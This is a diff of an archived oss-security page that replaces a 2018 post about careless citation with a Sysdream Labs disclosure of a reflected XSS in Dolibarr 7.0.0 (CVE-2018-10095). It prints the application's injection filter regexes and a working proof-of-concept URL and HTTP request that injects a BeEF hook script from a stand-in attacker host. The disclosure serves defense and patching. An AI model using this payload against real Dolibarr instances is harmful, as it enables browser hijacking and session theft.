@@ -1,54 +1,202 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/12/4
-Message-ID: <709-1515769090.506949@jdQ9.qWPC.bG_Z>
-Date: Fri, 12 Jan 2018 14:58:10 +0000
-From: halfdog <me@...fdog.net>
-To: oss-security@...ts.openwall.com
-Subject: On reading, thinking, copying
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/21/3
+Message-ID: <68a65b68-36a2-3e68-63ce-1c56360710a0@sysdream.com>
+Date: Mon, 21 May 2018 08:51:35 +0200
+From: Sysdream Labs <labs@...dream.com>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: Dolibarr XSS Injection vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
-
-After getting home from work (and after fixing my emulated server
-that could not handle the SSL handshakes any more), I was quite
-amused reading the references around yesterday's CVE-2018-1000001.
-
-Derived from that, here some hints to improve quality in security
-information handling:
+# [CVE-2018-10095] Dolibarr XSS Injection vulnerability
 
 
-1) The first link in an article usually is not the most important
-one. This is due to probability theory and correlates with the
-number of citations in the article. It even is less likely to
-be relevant, when the article starts citing the historic context
-- unless you are a software archeologist.
+## Description
 
-2) If the resource behind the first reference has some well-known
-name in the first few lines, you should not conclude, that this
-prooves the argument, you want to have prooven. You should still
-read, what this source says and put it in the context of the current
-argument. Otherwise you might end up at crap-press quality level:
-cite Harvard in the first line (no one will check the reference
-anyway) and the claim whatever you want.
+Dolibarr is an "Open Source ERP & CRM for Business" used by many
+companies worldwide.
 
-3) There are quite some differences between an errant lxstat call
-and a buffer overflow. SOC members should know that. While the
-first by itself is just a bug and has zero security relevance
-when triggered in a fully user-controlled directory structure
-(proove me wrong), still the later might have quite severe security
-implications.
+It is available through [GitHub](https://github.com/Dolibarr/dolibarr)
+or as distribution packages (e.g .deb package).
 
-4) Just because someone else copied crap without thinking, you
-should not do the same.
+**Threat**
+
+The application does not handle user input properly, allowing
+client-side JavaScript code injection (XSS).
+
+**Expectation**
+
+User input should be filtered to avoid arbitrary HTML injection.
 
 
-Here is a suboptimal Google dork to get an approximate ranking
-of the most popular copy-without-thinking sites related to this
-issue (and subtract automated feed forwarding and correct context
-citations by hand).
+## Vulnerability type
 
-https://www.google.com/search?q=%22CVE-2018-1000001%22+%22sourceware.org/bugzilla/show_bug.cgi%3Fid%3D18203%22&filter=0
+**CVE ID**: CVE-2018-10095
 
-hd
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 7.4
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
 
 
+## Details
+
+Checks are enforced on user input via the `test_sql_and_script_inject()`
+function, which forbids some SQL keywords (e.g `union`, `create`,
+`insert`) and some XSS-related strings (`onfocus`, for instance).
+
+```php
+main.inc.php
+
+/**
+ * Security: SQL Injection and XSS Injection (scripts) protection
+(Filters on GET, POST, PHP_SELF).
+ *
+ * @param       string      $val        Value
+ * @param       string      $type       1=GET, 0=POST, 2=PHP_SELF
+ * @return      int                     >0 if there is an injection
+ */
+function test_sql_and_script_inject($val, $type)
+{
+    $inj = 0;
+    // For SQL Injection (only GET are used to be included into bad
+escaped SQL requests)
+    if ($type == 1)
+    {
+        $inj += preg_match('/updatexml\(/i',     $val);
+        $inj += preg_match('/delete\s+from/i',   $val);
+        $inj += preg_match('/create\s+table/i',  $val);
+        $inj += preg_match('/insert\s+into/i',   $val);
+        $inj += preg_match('/select\s+from/i',   $val);
+        $inj += preg_match('/into\s+(outfile|dumpfile)/i',  $val);
+    }
+    if ($type != 2) // Not common, we can check on POST
+    {
+        $inj += preg_match('/update.+set.+=/i',  $val);
+        $inj += preg_match('/union.+select/i',   $val);
+        $inj += preg_match('/(\.\.%2f)+/i',      $val);
+    }
+    // For XSS Injection done by adding javascript with script
+    // This is all cases a browser consider text is javascript:
+    // When it found '<script', 'javascript:', '<style', 'onload\s=' on
+body tag, '="&' on a tag size with old browsers
+    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
+    // More on
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+    $inj += preg_match('/<script/i', $val);
+    $inj += preg_match('/<iframe/i', $val);
+    $inj += preg_match('/Set\.constructor/i', $val);    // ECMA script 6
+    if (! defined('NOSTYLECHECK')) $inj += preg_match('/<style/i', $val);
+    $inj += preg_match('/base[\s]+href/si', $val);
+    $inj += preg_match('/<.*onmouse/si', $val);       // onmousexxx can
+be set on img or any html tag like <img title='...' onmouseover=alert(1)>
+    $inj += preg_match('/onerror\s*=/i', $val);       // onerror can be
+set on img or any html tag like <img title='...' onerror = alert(1)>
+    $inj += preg_match('/onfocus\s*=/i', $val);       // onfocus can be
+set on input text html tag like <input type='text' value='...' onfocus =
+alert(1)>
+    $inj += preg_match('/onload\s*=/i', $val);        // onload can be
+set on svg tag <svg/onload=alert(1)> or other tag like body <body
+onload=alert(1)>
+    $inj += preg_match('/onclick\s*=/i', $val);       // onclick can be
+set on img text html tag like <img onclick = alert(1)>
+    $inj += preg_match('/onscroll\s*=/i', $val);      // onscroll can be
+on textarea
+    //$inj += preg_match('/on[A-Z][a-z]+\*=/', $val);   // To lock event
+handlers onAbort(), ...
+    $inj += preg_match('/&#58;|&#0000058|&#x3A/i', $val);       //
+refused string ':' encoded (no reason to have it encoded) to lock
+'javascript:...'
+    //if ($type == 1)
+    //{
+        $inj += preg_match('/javascript:/i', $val);
+        $inj += preg_match('/vbscript:/i', $val);
+    //}
+    // For XSS Injection done by adding javascript closing html tags
+like with onmousemove, etc... (closing a src or href tag with not
+cleaned param)
+    if ($type == 1) $inj += preg_match('/"/i', $val);       // We
+refused " in GET parameters value
+    if ($type == 2) $inj += preg_match('/[;"]/', $val);     // PHP_SELF
+is a file system path. It can contains spaces.
+    return $inj;
+}
+```
+
+
+## Proof of Concept : injecting a Beef agent into the victim's browser
+
+**Exploit link**
+
+```
+http://dolibarr.lab:2080//dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%22%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%2e%6c%61%62%2f%62%65%65%66%2f%68%6f%6f%6b%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e&model=5160&optioncss=print
+```
+
+**HTTP Request**
+
+```http
+GET
+/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%22%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%2e%6c%61%62%2f%62%65%65%66%2f%68%6f%6f%6b%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e&model=5160&optioncss=print
+HTTP/1.1
+Host: dolibarr.lab:2080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64;
+x64; Trident/5.0)
+Connection: close
+Referer: http://dolibarr.lab:2080/dolibarr/adherents/cartes/carte.php
+Cookie:
+DOLSESSID_cac4a1e49e4040e845340fe919bd202b=8833dl7see43ifl6l9667huvt5
+
+
+...
+
+t><br>Login: <input size="10" type="text" name="foruserlogin"
+value=""><script
+src="https://attack.lab/beef/hook.js"></script>"><br><input
+class="button" type="submit" value="Build Doc"></form><br><img src="/dolibar
+```
+
+
+## Affected versions
+
+* Version 7.0.0 (last stable version as of March 2018) - previous
+versions are probably also vulnerable but not tested
+
+
+## Solution
+
+Update to 7.0.2
+([changelog](https://raw.githubusercontent.com/Dolibarr/dolibarr/develop/ChangeLog))
+
+## Timeline (dd/mm/yyyy)
+
+* 18/03/2018 : Initial discovery
+* 17/04/2018 : Contact with the editor
+* 17/04/2018 : Editor acknowledges the vulnerability
+* 18/04/2018 : Editor announces fixes in version 7.0.2
+* 21/05/2018 : Vulnerability disclosure
+
+## Credits
+
+* Issam RABHI (i dot rabhi at sysdream.com)
+* Kevin LOCATI (k dot locati at sysdream dot com)
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
